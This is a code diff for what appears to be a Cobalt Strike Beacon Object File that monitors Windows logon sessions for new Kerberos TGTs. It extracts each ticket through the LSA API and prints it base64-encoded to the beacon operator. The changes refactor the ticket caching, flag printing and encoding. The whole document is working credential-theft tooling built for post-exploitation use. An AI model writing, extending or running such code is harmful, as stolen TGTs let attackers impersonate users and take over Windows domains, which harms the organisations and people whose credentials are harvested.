@@ -2,10 +2,6 @@
 #include "beacon.h"
 #include "common.h"
 
-NTSTATUS IsSystem() {
-    return STATUS_SUCCESS; 
-}
-
 NTSTATUS GetLsaHandle(HANDLE* hLsa) {
     NTSTATUS status = STATUS_SUCCESS;
     HANDLE hLsaLocal = NULL;
@@ -41,7 +37,7 @@ NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING
     request->EncryptionType = 0;
     request->TargetName = target;
     request->TargetName.Buffer = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
-    _memcpy(request->TargetName.Buffer, target.Buffer, target.MaximumLength);
+    MSVCRT$memcpy(request->TargetName.Buffer, target.Buffer, target.MaximumLength);
 
     status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, (PVOID*)&response, &responseSize, &protocolStatus);
     MemFree(request);
@@ -58,7 +54,7 @@ NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING
         return STATUS_MEMORY_NOT_ALLOCATED;
     }
 
-    _memcpy(*ticket, response->Ticket.EncodedTicket, *ticketSize);
+    MSVCRT$memcpy(*ticket, response->Ticket.EncodedTicket, *ticketSize);
     SECUR32$LsaFreeReturnBuffer(response);
     return STATUS_SUCCESS;
 }
@@ -95,7 +91,8 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
             if (sessionData->UserName.Buffer && sessionData->UserName.Length > 0)
                 KERNEL32$WideCharToMultiByte(CP_ACP, 0, sessionData->UserName.Buffer, sessionData->UserName.Length / 2, username, sizeof(username), NULL, NULL);
 
-            if (_strcmp(username, targetUser) != 0) {
+            // Case-insensitive name comparison
+            if (MSVCRT$_stricmp(username, targetUser) != 0) {
                 SECUR32$LsaFreeReturnBuffer(sessionData);
                 continue;
             }
@@ -114,53 +111,27 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
             continue;
 
         // Iterate through result to find TGTs
-        BOOL krbtgtFound = FALSE;
         for (ULONG j = 0; j < response->CountOfTickets; j++) {
             KERB_TICKET_CACHE_INFO_EX* t = &response->Tickets[j];
 
-            // Deduplicate TGTs per session
-            char spn[256] = { 0 };
-            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerName.Buffer, t->ServerName.Length / 2, spn, sizeof(spn), NULL, NULL);
+            // Skip service tickets by filtering for SPNs that start with "krbtgt/"
+            if (MSVCRT$wcsncmp(t->ServerName.Buffer, L"krbtgt/", 7) != 0)
+                continue;
 
-            if (_strncmp(spn, "krbtgt/", 7) == 0) {
-                if (krbtgtFound) continue;
-                krbtgtFound = TRUE;
-            }
-
-            // Copy fields on the ticket entry
+            // Create TGT entry
             PTICKET_ENTRY entry = &cache->tickets[cache->count++];
-            entry->luid = sessionList[i];
-
-            USHORT spnLen = t->ServerName.Length < (USHORT)(sizeof(entry->spn) - 2) ? t->ServerName.Length : (USHORT)(sizeof(entry->spn) - 2);
-            _memcpy(entry->spn, t->ServerName.Buffer, spnLen);
-
-            USHORT cnLen = t->ClientName.Length < (USHORT)(sizeof(entry->clientName) - 2) ? t->ClientName.Length : (USHORT)(sizeof(entry->clientName) - 2);
-            _memcpy(entry->clientName, t->ClientName.Buffer, cnLen);
-
-            USHORT crLen = t->ClientRealm.Length < (USHORT)(sizeof(entry->clientRealm) - 2) ? t->ClientRealm.Length : (USHORT)(sizeof(entry->clientRealm) - 2);
-            _memcpy(entry->clientRealm, t->ClientRealm.Buffer, crLen);
-
-            USHORT srLen = t->ServerRealm.Length < (USHORT)(sizeof(entry->serverRealm) - 2) ? t->ServerRealm.Length : (USHORT)(sizeof(entry->serverRealm) - 2);
-            _memcpy(entry->serverRealm, t->ServerRealm.Buffer, srLen);
-
-            entry->cacheInfo = *t;
-            entry->cacheInfo.ServerName.Buffer = entry->spn; 
-            entry->cacheInfo.ServerName.Length = spnLen; 
-            entry->cacheInfo.ServerName.MaximumLength = sizeof(entry->spn);
-
-            entry->cacheInfo.ClientName.Buffer = entry->clientName; 
-            entry->cacheInfo.ClientName.Length = cnLen; 
-            entry->cacheInfo.ClientName.MaximumLength = sizeof(entry->clientName);
-
-            entry->cacheInfo.ClientRealm.Buffer = entry->clientRealm; 
-            entry->cacheInfo.ClientRealm.Length = crLen; 
-            entry->cacheInfo.ClientRealm.MaximumLength = sizeof(entry->clientRealm);
-
-            entry->cacheInfo.ServerRealm.Buffer = entry->serverRealm;
-            entry->cacheInfo.ServerRealm.Length = srLen; 
-            entry->cacheInfo.ServerRealm.MaximumLength = sizeof(entry->serverRealm);
+            entry->luid           = sessionList[i];
+            entry->startTime      = t->StartTime;
+            entry->endTime        = t->EndTime;
+            entry->renewTime      = t->RenewTime;
+            entry->ticketFlags    = t->TicketFlags;
+            entry->encryptionType = t->EncryptionType;
+            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerName.Buffer, t->ServerName.Length / 2, entry->spn,         sizeof(entry->spn),         NULL, NULL);
+            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ClientName.Buffer, t->ClientName.Length / 2, entry->clientName,  sizeof(entry->clientName),  NULL, NULL);
+            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ClientRealm.Buffer, t->ClientRealm.Length / 2, entry->clientRealm, sizeof(entry->clientRealm), NULL, NULL);
+            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerRealm.Buffer, t->ServerRealm.Length / 2, entry->serverRealm, sizeof(entry->serverRealm), NULL, NULL);
+            break; 
         }
-
         SECUR32$LsaFreeReturnBuffer(response);
     }
 
@@ -168,80 +139,94 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
     return STATUS_SUCCESS;
 }
 
-#define PrintFlag(mask, name) if (flags & (mask)) { BeaconPrintf(CALLBACK_OUTPUT, f ? name : ", " name); f = FALSE; }
+VOID PrintTime(LARGE_INTEGER* li) {
+    TIME_FIELDS tf = { 0 };
+    NTDLL$RtlTimeToTimeFields(li, &tf);
+    BeaconPrintf(CALLBACK_OUTPUT, "%d/%d/%d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
+}
 
-VOID PrintTicketInformation(KERB_TICKET_CACHE_INFO_EX cacheInfo, LUID luid) {
-    SYSTEMTIME now, start, end, renew;
-    
-    KERNEL32$GetSystemTime(&now);
-    start = ConvertToSystemtime(cacheInfo.StartTime);
-    end   = ConvertToSystemtime(cacheInfo.EndTime);
-    renew = ConvertToSystemtime(cacheInfo.RenewTime);
+static const FLAG_ENTRY kerbFlags[] = {
+    { reserved,          "reserved"           },
+    { forwardable,       "forwardable"        },
+    { forwarded,         "forwarded"          },
+    { proxiable,         "proxiable"          },
+    { proxy,             "proxy"              },
+    { may_postdate,      "may_postdate"       },
+    { postdated,         "postdated"          },
+    { invalid,           "invalid"            },
+    { renewable,         "renewable"          },
+    { initial,           "initial"            },
+    { pre_authent,       "pre_authent"        },
+    { hw_authent,        "hw_authent"         },
+    { ok_as_delegate,    "ok_as_delegate"     },
+    { anonymous,         "anonymous"          },
+    { name_canonicalize, "name_canonicalize"  },
+    { enc_pa_rep,        "enc_pa_rep"         },
+    { reserved1,         "reserved1"          },
+};
 
-    // Build "ClientName@ClientRealm"
-    char user[512] = { 0 };
-    int cnChars = cacheInfo.ClientName.Length / 2;
-    int crChars = cacheInfo.ClientRealm.Length / 2;
-    int cnBytes = KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ClientName.Buffer, cnChars, user, sizeof(user) - 1, NULL, NULL);
-    if (cnBytes < 0) cnBytes = 0;
-    user[cnBytes] = '@';
-    KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ClientRealm.Buffer, crChars, user + cnBytes + 1, (int)sizeof(user) - cnBytes - 2, NULL, NULL);
-
+VOID PrintTicketInformation(PTICKET_ENTRY entry) {
     // Header
-    int nowHour = now.wHour % 12; if (!nowHour) nowHour = 12;
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d/%d/%d %d:%02d:%02d %s UTC - Found new TGT:\n",
-        now.wMonth, now.wDay, now.wYear, nowHour, now.wMinute, now.wSecond,
-        now.wHour >= 12 ? "PM" : "AM");
-
-    // Fields
+    SYSTEMTIME now;
+    KERNEL32$GetSystemTime(&now);
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d/%d/%d %02d:%02d:%02d UTC - Found new TGT\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond);
+    
+    // Ticket information
+    char user[512] = { 0 };
+    MSVCRT$_snprintf(user, sizeof(user) - 1, "%s @ %s", entry->clientName, entry->clientRealm);
     BeaconPrintf(CALLBACK_OUTPUT, "  User           :  %s\n", user);
+    BeaconPrintf(CALLBACK_OUTPUT, "  LogonId        :  0x%lx\n", entry->luid.LowPart);
+    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  "); PrintTime(&entry->startTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  "); PrintTime(&entry->endTime);   BeaconPrintf(CALLBACK_OUTPUT, "\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "  RenewTill      :  "); PrintTime(&entry->renewTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
-    int sh = start.wHour % 12; if (!sh) sh = 12;
-    int eh = end.wHour   % 12; if (!eh) eh = 12;
-    int rh = renew.wHour % 12; if (!rh) rh = 12;
-    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  %d/%d/%d %d:%02d:%02d %s\n", start.wMonth, start.wDay, start.wYear, sh, start.wMinute, start.wSecond, start.wHour >= 12 ? "PM" : "AM");
-    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  %d/%d/%d %d:%02d:%02d %s\n", end.wMonth, end.wDay, end.wYear, eh, end.wMinute, end.wSecond, end.wHour >= 12 ? "PM" : "AM");
-    BeaconPrintf(CALLBACK_OUTPUT, "  RenewTill      :  %d/%d/%d %d:%02d:%02d %s\n", renew.wMonth, renew.wDay, renew.wYear, rh, renew.wMinute, renew.wSecond, renew.wHour >= 12 ? "PM" : "AM");
-
-    // Flags (comma-separated)
-    UINT flags = cacheInfo.TicketFlags;
-    BOOL f = TRUE;
+    // Flags
+    UINT flags = entry->ticketFlags;
+    BOOL first = TRUE;
     BeaconPrintf(CALLBACK_OUTPUT, "  Flags          :  ");
-    PrintFlag(reserved, "reserved")
-    PrintFlag(forwardable, "forwardable")
-    PrintFlag(forwarded, "forwarded")
-    PrintFlag(proxiable, "proxiable")
-    PrintFlag(proxy, "proxy")
-    PrintFlag(may_postdate, "may_postdate")
-    PrintFlag(postdated, "postdated")
-    PrintFlag(invalid, "invalid")
-    PrintFlag(renewable, "renewable")
-    PrintFlag(initial, "initial")
-    PrintFlag(pre_authent, "pre_authent")
-    PrintFlag(hw_authent, "hw_authent")
-    PrintFlag(ok_as_delegate, "ok_as_delegate")
-    PrintFlag(anonymous, "anonymous")
-    PrintFlag(name_canonicalize, "name_canonicalize")
-    PrintFlag(enc_pa_rep, "enc_pa_rep")
-    PrintFlag(reserved1, "reserved1")
-    BeaconPrintf(CALLBACK_OUTPUT, "\n");    
+    for (int k = 0; k < sizeof(kerbFlags) / sizeof(kerbFlags[0]); k++) {
+        if (flags & kerbFlags[k].mask) {
+            BeaconPrintf(CALLBACK_OUTPUT, first ? "%s" : ", %s", kerbFlags[k].name);
+            first = FALSE;
+        }
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "\n");
+}
+
+static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+char* EncodeTicket(PBYTE data, ULONG size) {
+    ULONG outLen = ((size + 2) / 3) * 4 + 1;
+    char* out = MemAlloc(outLen);
+    if (!out) return NULL;
+
+    ULONG i = 0, j = 0;
+    while (i < size) {
+        ULONG rem  = size - i;
+        BYTE  b0   = data[i++];
+        BYTE  b1   = rem > 1 ? data[i++] : 0;
+        BYTE  b2   = rem > 2 ? data[i++] : 0;
+        out[j++] = b64chars[b0 >> 2];
+        out[j++] = b64chars[((b0 & 3) << 4) | (b1 >> 4)];
+        out[j++] = rem > 1 ? b64chars[((b1 & 0xF) << 2) | (b2 >> 6)] : '=';
+        out[j++] = rem > 2 ? b64chars[b2 & 0x3F] : '=';
+    }
+    out[j] = '\0';
+    return out;
 }
 
 VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CACHE curr) {
-
     BOOL cacheUpdated = FALSE; 
-
+    
     // Compare ticket caches to identify new TGTs
     for (int i = 0; i < curr->count; i++) {
         PTICKET_ENTRY currEntry = &curr->tickets[i];
         BOOL found = FALSE;
-
         for (int j = 0; j < prev->count; j++) {
             PTICKET_ENTRY prevEntry = &prev->tickets[j];
             if (
                 currEntry->luid.LowPart == prevEntry->luid.LowPart  &&
                 currEntry->luid.HighPart == prevEntry->luid.HighPart  &&
-                _memcmp(currEntry->spn, prevEntry->spn, sizeof(currEntry->spn)) == 0
+                MSVCRT$strcmp(currEntry->spn, prevEntry->spn) == 0
             ){
                 found = TRUE;
                 break;
@@ -250,31 +235,29 @@ VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CA
 
         // Print new TGT
         if (!found) {
+            WCHAR wspn[256] = { 0 };
+            toWideChar(currEntry->spn, wspn, sizeof(wspn));
             UNICODE_STRING target = {
-                .Buffer = currEntry->spn,
-                .Length = (USHORT)(_wcslen(currEntry->spn) * 2),
-                .MaximumLength = (USHORT)(_wcslen(currEntry->spn) * 2 + 2)
+                .Buffer = wspn,
+                .Length = (USHORT)(MSVCRT$wcslen(wspn) * 2),
+                .MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2)
             };
-
-            PrintTicketInformation(currEntry->cacheInfo, currEntry->luid);
-
+            PrintTicketInformation(currEntry);
             PBYTE ticket = NULL;
             ULONG ticketSize = 0;
             if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, currEntry->luid, target, &ticket, &ticketSize)) && ticket && ticketSize) {
-                char* b64 = Base64Encode(ticket, ticketSize);
+                char* b64 = EncodeTicket(ticket, ticketSize);
                 if (b64) {
                     BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", b64);
                     MemFree(b64);
                 }
                 MemFree(ticket);
             }
-
             cacheUpdated = TRUE;
         }
     }
-
     if (cacheUpdated){
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Tickets in cache: %d\n", curr->count);
+        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Ticket cache size: %d\n", curr->count);
         BeaconWakeup(); 
     }
 }
@@ -294,9 +277,8 @@ VOID go(char* args, int argc) {
     }
     
     HANDLE hLsa = 0;
-    if (!NT_SUCCESS(GetLsaHandle(&hLsa))){
+    if (!NT_SUCCESS(GetLsaHandle(&hLsa)))
         return;
-    }
     
     ULONG authPackage = 0;
     LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
@@ -306,9 +288,8 @@ VOID go(char* args, int argc) {
     }
     
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting TGT monitor (interval: %ds)\n", interval);
-    if (targetUser && targetUser[0] != '\0'){
+    if (targetUser && targetUser[0] != '\0')
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Target user: %s\n", targetUser);
-    }
     BeaconWakeup(); 
 
     TICKET_CACHE prev = { 0 };
@@ -338,5 +319,4 @@ VOID go(char* args, int argc) {
 
     SECUR32$LsaDeregisterLogonProcess(hLsa);
     BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
-    return;
 }
